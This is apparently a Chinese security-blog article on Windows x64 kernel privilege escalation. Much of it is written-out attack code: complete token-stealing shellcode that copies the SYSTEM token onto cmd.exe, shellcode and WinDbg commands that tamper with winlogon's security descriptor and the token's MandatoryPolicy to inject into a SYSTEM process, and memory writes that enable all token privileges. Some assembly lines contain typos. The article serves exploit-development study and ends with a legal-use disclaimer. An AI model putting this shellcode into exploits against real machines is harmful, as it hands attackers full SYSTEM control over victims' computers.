<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/s_3fQYe9rHLYaOuXUqJCgg)

**前置知识推荐：**

https://cloud.tencent.com/developer/article/1471233

http://terminus.rewolf.pl/terminus/

https://ntdiff.github.io/#versionLeft=Win7%2Fx64%2FSystem32&filenameLeft=ntoskrnl.exe&typeLeft=Standalone%2F_KPCR&versionRight=Win10_20H2_20H2%2Fx64%2FSystem32&filenameRight=ntoskrnl.exe&typeRight=Standalone%2F_KPCR

**令牌窃取**

在 Windows 中令牌窃取是一个常用于权限提升的技术，再利用过程中必须定位 EPROCESS 结构，一般我

们会使用常量来定位此类结构，比如在 GS 中 0x188 为 KTHREAD 结构，我们可以通过其来定位其他结构，

我们可以先把它放入 R9 寄存器中：

```
mov r9, qword ptr gs:[0x188]
```

目前我们已经在 r9 中保存了 KTHREAD，下面我们可以来定位 Process，也就是在 KTHREAD 的 + 0x200 处。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QQD3pBwGUic1ySwzCriczj0ZBGwa2Oc4EwaayQHH6Xc48Z6pRAb4wUugQ/640?wx_fmt=png)

转换为汇编就是：

```
mov r9, qword ptr[r9+0x220]
```

由于我们要提升父进程的权限，我们需要找到 cmd.exe 的 ProcessID

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QZ018bglAKvVPYEQYoP0XYoTqSjKuL7OoE5NL7C2UN915tAsaMBDN8w/640?wx_fmt=png)

转换成汇编就是：

```
mov r8, qword ptr[r9+0x540]
```

下面就是找到它的 EPROCESS 地址，我们可以在偏移 +0x440 和 +0x448 处看到我们有 ProcessID 和 ActiveProcessLinks 结构。

后一个值是可以解析的 EPROCESS 对象的链接列表，其中每个 PID 与属于 cmd.exe 的 PID 进行比较，

保存在 r8 寄存器中。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Q1syB0KcnURhJbSzGVf6ZzvtqMYbpOQSNx7lqPvCV0hAmUPt7m3LDZQ/640?wx_fmt=png)

```
mov rax, r9
loop1:
mov rax, qword ptr [rax + 0x448]
sub rax, 0x448
cmp qword ptr[rax + 0x440],r8
jne loop1
```

一旦我们找到了 cmd.exe 的 EPROCESS 数据结构，我们就可以检查它并在偏移量 0x4b8 处找到 Token 对象。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Q2E6Ja5bljl2dnDQSAicSxiaibzTu9v37z3BdibLZvEODmicKtGIHmzFuPTQ/640?wx_fmt=png)

```
mov rcx, rax
add rcx, 0x4b8
```

下面就是在刚才的进程列表中寻找 system 进程，并复制令牌。

```
mov rax, r9
loop2:
mov rax, qword ptr [rax +0x448].
sub rax, 0x448
cmp [rax + 0x440], 4
jne loop2
mov rdx, reax
add rdx, 0x4b8
```

然后就是覆盖令牌

```
mov rdx, qword ptr [rdx]
mov qword ptr [rcx], rdx
ret
```

最后的 shellcode

```
[BITS 64]
start:
mov r9, [gs:0x188] ;stores KPROCESS/currentThread value
mov r9, [r9+0x220] ;stores EPROCESS as an offset to KTHREAD
mov r8, [r9+0x540] ;stores InheritedFromUniqueProcessId
(cmd.exe PID)
mov rax, r9 ;moves cmd's EPROCESS into eax
loop1:
mov rax, [rax + 0x448] ;saves the next linked list pointer into
rax
sub rax, 0x448 ;gets the KPROCESS
cmp [rax + 0x440],r8 ;compare the ProcessId with cmd's.
jne loop1 ;if not equal, repeat
mov rcx, rax ;if equal, saves cmd's EPROCESS into rcx
add rcx, 0x4b8 ;store cmd's token into rcx
mov rax, r9 ;moves cmd's EPROCESS into eax
loop2:
mov rax, [rax +0x448] ;saves the next linked list pointer into
rax
sub rax, 0x448 ;gets the KPROCESS
cmp byte [rax + 0x440], 4 ;compare the ProcessId with System(4)
jne loop2 ;if not equal, repeat
mov rdx, rax ;if equal, saves System's EPROCESS into
rdx
add rdx, 0x4b8 ;stores System's token pointer into rdx
mov rdx, [rdx] ;stores System's token value into rdx
mov [rcx], rdx ;replace cmd's original token with
System's
ret
```

windbg 操作，查找 system 进程：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QDdIXmA8zja59RY7jibKmicJrXTtL9iaoHSSbs9lbPlrg9cmcsiaTHjuhtA/640?wx_fmt=png)

查看其结构：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QECbsLdFmTgPrFbxjrBRic4bqpoP0mPBpPBh2pkCduicVXDR88JtSYgTA/640?wx_fmt=png)

在 0x4b8 处为 Token 其对应的结构体如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QvUlEKZNWuh0NIkgiajkSlLwbdRp6MEnd1f4IiaHcST6ibRhMoKiamMUjnQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QOo3fAI7bGAohpoa7KibsBzleg9wmojj7GtiaOPEjeicGrIHIUBw3oNJ2A/640?wx_fmt=png)

其 RefCnt 为 0y1010，即十进制的 10，你可以看到其为 10，但我们需要取反：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QEEBzliaAEUA5icBN2QtxZkYcCFj9JqrYrlcBB32PU5s0EJLibasvIlewA/640?wx_fmt=png)

然后启动 cmd 进程：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Q11yapA4JmtId89fzUhrAMcbPORo1kTnys1cRKPetZ1GKUDQccicvkkA/640?wx_fmt=png)

替换 Token：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QbkfeibDOjicq6wLK8Bxx1eCfsceafueL2yrlocXWSt6gY03sEPsgib8cw/640?wx_fmt=png)

**ACL 修改**

ACL 为 Windows 安全模型中重要的一环，在 windows(1607 (Build 14393)) 版本之前的系统中，可以使用

SecurityDescriptor 置空来实现对 ACL 的任意操控，比如某个进程以 system 进程启动，在具有 ACL 的情况

下我们在没用相关权限的情况下是无法对其进行操作的，但如果将其 ACL 置空我们便可以对其进行操

作，然后使用如进程注入之类的技术来进行 system 权限的 shell 派生，达到权限提升的操作。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QMNfPic2YUVD2aaOJSvyUWTZU8ic3DOAeicwFdBbPDjqlk3knMItgKLE1A/640?wx_fmt=png)

拿 explorer 为例，查看其结构

```
!process 0 0 explorer.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QbYISicA2O0miaat9nWVibfTOUk9xJbUZ22OUPgjLVkMgj4Vx7o1hSqxUQ/640?wx_fmt=png)

查看 Object 结构

```
!object ffffc08f854ca080
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QN3Jyicjs4NkWib5Xicb6EMYibrFPny2VyVoqSibawiawLpAJtG3FMmGqBzwQ/640?wx_fmt=png)

其中的 ObjectHeader 为结构的具体地址，查看其结构：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QpocI2lH99FgKbicKDWfhVAibOuGMvvJ8F4G0T5GHegCAuiaSJzAZtoB3g/640?wx_fmt=png)

可以看到在 0X028 处为安全描述符。而 Body 处则是指向进程对象的起始位置。你此时查看其描述是无法 看到的：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Qg8qLwK07iaAZqtK0akn22mdkSTwYWGDASEEEntmZ6KB3f4h08KQuDiaQ/640?wx_fmt=png)

因为该地址为伪地址，你需要将其第四位置空，简单来说就是用 & 操作：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QrLveW3VmLwXSZc1715tcKed4et0cyGGJlqowQVEgZGRPcjFlmVxSTg/640?wx_fmt=png)

其本质为 SecurityDescriptor 指针指向 SECURITY_DESCRIPTOR 对象，该对象包含具有一个或多个 ACCESS_ALLOWED_ACE 结构的 DACL：

```
typedef struct _SECURITY_DESCRIPTOR {
UCHAR Revision;
UCHAR Sbz1;
SECURITY_DESCRIPTOR_CONTROL Control;
PSID Owner;
PSID Group;
PACL Sacl;
PACL Dacl;
} SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;
```

其中 AceCount 为 0x3，说明其包含 3 个 ACE，其类型皆为 ACCESS_ALLOWED_ACE_TYPE，且其中一个用 于 S-1-5-18：system。

而如果此时你将其置空的话：

```
eq 0xffffd28d`fcebc763 0
```

则会触发蓝屏：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Q9BEOwTqRlvawluicnM6wiaIzB3k337bkhnPcsrzXTk13ymTAm8ZicdscQ/640?wx_fmt=png)

这是因为笔者的测试系统为 20H2，在 windows 的 1607 之后增加了缓解 ACL 置空攻击的手段，其伪代码 如下：

```
if(ObjectHeader.SecurityDescriptor == NULL && (ObjectType.SecurityRequired ||
(ObjectHeader.InfoMask &2) != 0))
{
BugCheckEx(BAD_OBJECT_HEADER);
}
```

如果想查看 ACE 的话，可以看到安全描述符的结构 (ACE 在 0x30 处)：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QIVIlWkerq09JGoLhD3OWRyweJZz6F9XcVCFr7KN28XFrVbGSJSlAGA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QhGSkN3nYytjnS6aznBXoJVWf1AvvSPP9Y2zibMkIhmKSLhvUJuKhibtA/640?wx_fmt=png)

因为微软并没有提供相关结构，所以只能手工查看：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QBMvExgvy2ILLWEmba7FCyCFoic8ThIkudf2grzansKX9lSR0icTKnWMQ/640?wx_fmt=png)

而我们的目标也就是把 S-1-5-18 修改为 S-1-5-15，即 18(0x12) 改成 15(0xf)。因为我目前的进程非 system 进程，所以查看的话显示的就是 15：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QoR5KtsQGmxZHobtOK807TpOv6OwjVzGssjtj03Q7BDZmgKHcAwBpXA/640?wx_fmt=png)

所以我换成一个 system 进程即 winlogon 进程再来查看：

```
db ffff9c0a87e44760+48 L1
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QcNwV7MIR4eZefNRtPUiasEjDBJh1qn2Mhv1GwcR3ldd0Q1mo2KPpQtA/640?wx_fmt=png)

至于 48 这个值怎么来的，则是前人总结的结果，而我们只需要修改其为 b 即可达到我们的效果, 修改的信 息：

```
eb ffff9c0a87e44760+48 b
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QbjebrxDC7Ek21dXiay0vIFGOn2peMq25HeErfR5eRNttU2pwSicYQosQ/640?wx_fmt=png)

已变成 s-1-5-11。process explore 显示如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QRFNg2twqQMibXbF0ELcl2gvpuZFb9WnoufZLiabvr7xmDEjpG9mP7JRg/640?wx_fmt=png)

但此时你仍然无法完成利用进程注入派生 system 进程的过程：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Qt9f9C6NfXAHmqPT3cMYslDzTlRbTxqlELtzSwKms8fbtC3dn06Sggw/640?wx_fmt=png)

这个跟我们的进程上下文有关，我们可以查看注入进程的 Token 信息：

```
dt _Token (poi(ffff818dc050a080+4b8) & fffffffffffffff0)
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Q05VUjMib9UwRFcr0Lvic3Gf3DLVT3dF5u8HujIRHeFrQG1icmcM5LzC3g/640?wx_fmt=png)

其中的 MandatoryPolicy 值为 3。而默认 winlogon 进程的 MandatoryPolicy 的值为 1。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QQJt8kkZKEby3negzUc832Z8E6RLPibC67UqMXxMg8xDx2oXn5GhYrJw/640?wx_fmt=png)

而按照 msdn 所说只要将其该为 0 即可注入：

```
eb (poi(ffff818dc050a080+4b8) & fffffffffffffff0)+0d4 0
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QdicCpEahZwKMHBC9fE31uquozw2zt4fgyBPnJuVIYZ4kCbViaItuBnnA/640?wx_fmt=png)

此时再进行注入，成功得到 system 的 cmd：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QibLj2oNbEeTl3kPImYW7n14l6ZpHPS83deXpuWfibS1Qu8GUNJHhp7zA/640?wx_fmt=png)

下面就是 shellcode 的编写了，跟之前的一样通过 gs 找 KTHREAD 然后用 KTHREAD 找 EPROCESS

```
mov r9, [gs:0x188] ;stores KPROCESS/currentThread value
mov r9, [r9+0x220] ;stores EPROCESS as an offset to KTHREAD
mov rax,r9
```

然后在 5a8 处找到 ImageFileName：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QFZcheZPdePy8FiaFYvBnUJ4KhY4dVJJMicE2dQVzOcT0qQU62J6qPcAQ/640?wx_fmt=png)

实现：

```
mov rax, [rax+448h]
procloop:
lea rbx, [rax-448h]
mov rax, [rax]
add rbx, 5a8h
cmp dword ptr [rbx], 6c6e6977h
jne procloop
```

找到后就是利用其 SecurityDescriptor 来将其偏移处的地址改为 0：

```
sub rbx, 458h
mov rax, qword ptr [rbx]
and rax, 0FFFFFFFFFFFFFFF0h
add rax, 48h
mov byte ptr [rax], 0bh
```

然后就是修改令牌：

```
add rcx, 4b8h
mov rax, qword ptr [rcx]
and rax, 0FFFFFFFFFFFFFFF0h
add rax, 0d4h
mov byte ptr [rax], 0
ret
```

**Token 修改**

在 Token 结构体中，有一个名为 Privileges 的属性，其本质为一个_SEP_TOKEN_PRIVILEGES 结构体

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QGlqXQu4ickWToj5swxLJ9CKe92eaHic6OPLd2NEQ3jEt62Y5lohSDswg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QflDvg5CY6I2pDJBhQbVCR5k77gxiclMGP2HhLx6icv78VSo3zfeYnG6g/640?wx_fmt=png)

而我们则是需要修改该结构体实现权限提升

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Qr3Id9GtCkRL592NvepR0icBZrfwRSJCJcibRPfBExmUe7kgMWOv9icJAQ/640?wx_fmt=png)

查看其结构体与其权限：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QNicEd0PQkrL8hgIIbqiccWU2KGicuYYMhBUCV7sIz0A9L97lJrNULKxgw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QOqoOvXg9tibfhy2QI148K760zjjoHaXxNqQ74Wo8ibaCD4oOdBb0Y7oA/640?wx_fmt=png)

然后修改我们 cmd 的结构体：

```
lkd> eq ffffc70255ded060+0x040 0x0000001f`f2ffffbc
lkd> eq ffffc70255ded060+0x048 0x0000001f`f2ffffbc
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Qo5zS7TbF3uTUlJ7nfOxSJFosoMmia8yfibJiaVLlfN4SvHibwL0L0K3iatQ/640?wx_fmt=png)

此时已获得所有权限：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0QY3o5A1He8CAGyeZriaZPdtjqyPichcI4nZda0FJ8Gqddc8Xmhu4lLTcw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WvZQomJ0LNPrQoBAiawWE0Q4lkkqictq71TiaPPuOf2iaAlNhopk6P3tDMK3Y4jicPnGEOib7zTkJ2uzDw/640?wx_fmt=png)

  

  

  

  

  

     ▼

更多精彩推荐，请关注我们

▼

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)